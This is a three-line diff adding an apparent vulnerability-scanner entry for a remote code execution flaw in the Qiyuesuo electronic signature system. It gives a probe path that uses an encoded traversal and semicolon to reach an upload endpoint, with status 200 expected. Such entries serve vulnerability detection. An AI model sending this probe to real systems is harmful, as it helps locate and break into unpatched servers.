@@ -1,0 +1,3 @@
+name: "契约锁电子签章系统RCE"
+poc: "/callback/%2E%2E;/code/upload"
+status_code: 200
